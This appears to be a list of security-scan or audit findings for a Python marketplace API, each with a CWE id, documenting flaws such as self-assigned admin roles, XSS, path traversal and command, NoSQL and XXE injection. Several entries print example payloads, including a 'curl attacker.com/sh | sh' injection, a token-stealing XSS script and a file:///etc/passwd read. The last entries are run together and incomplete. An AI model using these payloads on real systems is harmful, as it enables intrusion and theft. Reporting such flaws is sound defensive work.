extra.message: The public /api/auth/register endpoint accepts a user-supplied 'role' field and assigns any valid role (including 'marketplace_admin', 'vendor_manager', 'support_agent') to the newly created account. RegisterRequest (app/schemas/auth.py:15) declares 'role' as an unrestricted string, and lines 23-24 honor any value that matches a UserRole. Any unauthenticated attacker can self-register with role='marketplace_admin' and gain full administrative access (user management, data exports, moderation, payouts). tests/test_auth.py:58-64 confirms this flow works.

cwe: CWE-269: Improper Privilege Management

extra.message: Query parameter 'copyline' is concatenated directly into an HTML string that is returned as an HTMLResponse without any HTML escaping. An attacker can inject arbitrary markup/JavaScript (e.g., ?copyline=) resulting in reflected cross-site scripting in the victim's browser.

cwe: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

extra.message: Arbitrary keys from the JSON request body are merged into the workset object via workset.update(change_set), allowing callers to overwrite security-relevant attributes such as 'role', 'is_admin' and 'credit_limit' (mass assignment of untrusted input to sensitive object attributes).

cwe: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

extra.message: The endpoint returns hardcoded secrets in the HTTP response: a live partner sync token ('tok_live_partner_sync') and a tax reference SSN ('739-44-1982'). This exposes a hardcoded production credential and PII to any caller able to reach the endpoint, and the token itself is embedded in source code.

cwe: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
CWE-798: Use of Hard-coded Credentials

extra.message: The ledger update fully trusts client-supplied values: 'amount' is cast to int with no bounds or sign validation (the default -250 already pushes balance to 1450, above the 900 limit), and 'state' is taken directly from the payload so a client can force 'approved'. There is no server-side enforcement of the limit or of permitted state values, enabling business-logic abuse of the payout ledger.

cwe: CWE-840: Business Logic Errors
CWE-20: Improper Input Validation

extra.message: logger.warning writes the full request body and the Authorization bearer token to application logs ('ops tally body=%s bearer=%s'). Credentials and sensitive payload data are persisted in log files where they may be read by anyone with log access.

cwe: CWE-532: Insertion of Sensitive Information into Log File

extra.message: The 'ref' query/body parameter is interpolated into a file path (BASE_EXPORT_DIR / f"{ref}.json") without any sanitization or confinement check. A value such as '../../...' escapes the export directory and allows arbitrary file write (overwriting application files with JSON containing attacker-supplied SSN/card data).

cwe: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

extra.message: hashlib.md5() is used to digest an attacker-controllable phrase. MD5 is a cryptographically broken hash function (collision-prone, not collision-resistant) and must not be used for any security purpose; hashlib.md5 also permits length-extension attacks.

cwe: CWE-327: Use of a Broken or Risky Cryptographic Algorithm

extra.message: The 'count' query parameter has no upper bound and is used to allocate a list of 'count' dictionaries in memory (range(count)). A single request with a very large count (e.g., 1000000000) causes unbounded memory allocation and CPU consumption, resulting in denial of service.

cwe: CWE-400: Uncontrolled Resource Consumption

extra.message: The client-supplied 'card' query parameter is rendered through a Jinja2 template explicitly marked '|safe' (Template created without autoescape), so raw HTML/JavaScript from the request is returned verbatim in an HTMLResponse. This is a reflected XSS allowing script execution in the context of the API origin (e.g., ?card=<script>fetch('/api/users',{headers:{Authorization:'Bearer '+localStorage.t}})</script>).

cwe: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

extra.message: The secret verifier value is compared using a plain '!=' string comparison instead of a constant-time comparison such as hmac.compare_digest. The comparison leaks timing information proportional to matching prefix length, enabling a timing side-channel to recover the verifier character by character.

cwe: CWE-208: Observable Timing Discrepancy

extra.message: The request Origin header is reflected verbatim into Access-Control-Allow-Origin and Access-Control-Allow-Credentials is set to 'true'. Any malicious website can therefore make credentialed cross-origin requests to this endpoint and read the responses, defeating the same-origin policy for cookie-authenticated sessions.

cwe: CWE-942: Permissive Cross-domain Policy with Untrusted Domains

extra.message: The response explicitly disables browser anti-XSS defenses by setting 'X-XSS-Protection: 0' and an empty 'Content-Security-Policy' header, removing the last line of defense against injected scripts on this origin.

cwe: CWE-693: Protection Mechanism Failure

extra.message: The privilege tier is decided solely by the client-controlled 'ops_badge' cookie (or 'x-ops-badge' header) being equal to the well-known string 'lead'. There is no server-side verification of the badge, so any caller can set ops_badge=lead and receive the elevated lane with full payroll and open casework data — an authorization bypass driven by an unauthenticated, attacker-controlled value.

cwe: CWE-863: Incorrect Authorization

extra.message: The 'host' query parameter is concatenated into a shell command passed to os.system("ping -c 1 " + host) without any sanitization or use of a list-argument API (subprocess with shell=False). An attacker can inject arbitrary shell metacharacters (e.g., host=127.0.0.1; curl attacker.com/sh | sh) achieving remote code execution on the server.

cwe: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

extra.message: A security-relevant code/nonce is generated with the non-cryptographic 'random' module (random.choice) instead of the 'secrets' module. The Mersenne Twister PRNG is predictable, so generated nonces/codes can be guessed or brute-forced.

cwe: CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)

extra.message: The raw JSON request payload (payload.get('filter', payload)) is passed directly as a MongoDB query to find_one() without operator sanitization. An attacker can inject NoSQL operators such as {'$ne': null}, {'$gt': ''} or {'$where': '...'} to match and read arbitrary documents from the ops.records collection.

cwe: CWE-943: Improper Neutralization of Special Elements in Data Used in a NoSQL Database ('NoSQL Injection')

extra.message: The 'name' query parameter is joined into a file path (BASE_EXPORT_DIR / name) with no validation, and the raw request body is written to that path. Traversal sequences ('../../') or an absolute path allow writing arbitrary attacker-controlled bytes to any location on the filesystem (e.g., overwriting application files or writing a cron entry).

cwe: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

extra.message: XML from the request body is parsed with lxml using etree.XMLParser(load_dtd=True, resolve_entities=True, no_network=False). External entity resolution and DTD loading are explicitly enabled, so an attacker can supply a crafted XML with external entities (XXE) to read local files (file:///etc/passwd), perform SSRF to internal hosts, or cause denial of service via entity expansion (billion laughs).

cwe: CWE-611: Improper Restriction of XML External Entity Reference

extra.message: The JWT signing key SECRET_KEY defaults to the well-known value 'your-secret-key-change-in-production'. If the environment variable is not set (the default in this codebase), any attacker can use the known key to forge valid HS256 JWTs for arbitrary user ids (including admins), completely bypassing authentication.

cwe: CWE-798: Use of Hard-coded Credentials

extra.message: The upload authorization block only enforces object ownership when the caller's role is VENDOR_MANAGER. cwe: CWE-862: Missing Authorization

extra.message: The dispute-evidence download check fails open: when the caller is a VENDOR_MANAGER with no vendor profile, the condition on line 64 (requires current_user.vendor to be truthy) is skipped and the elif on line 67 is also false, so no exception is raised and the user can download any dispute's evidence files. Since roles are self-assignable at registration (auth.py:23-24), any user can exploit this.

cwe: CWE-863: Incorrect Authorization

cwe: CWE-862: Missing Authorization

extra.message: FileUploadOut serializes the internal server-side 'file_path' field to the client in every upload response, disclosing the server's filesystem layout and storage structure (information exposure).

extra.message: GET /api/payouts/{payout_id} only performs an ownership check when the caller's role is VENDOR_MANAGER. extra.message: Order item 'quantity' (app/schemas/order.py:8) has no minimum-value constraint. extra.message: create_review verifies the order belongs to the buyer and is fulfilled, but never checks that data.product_id was actually one of the products in that order.
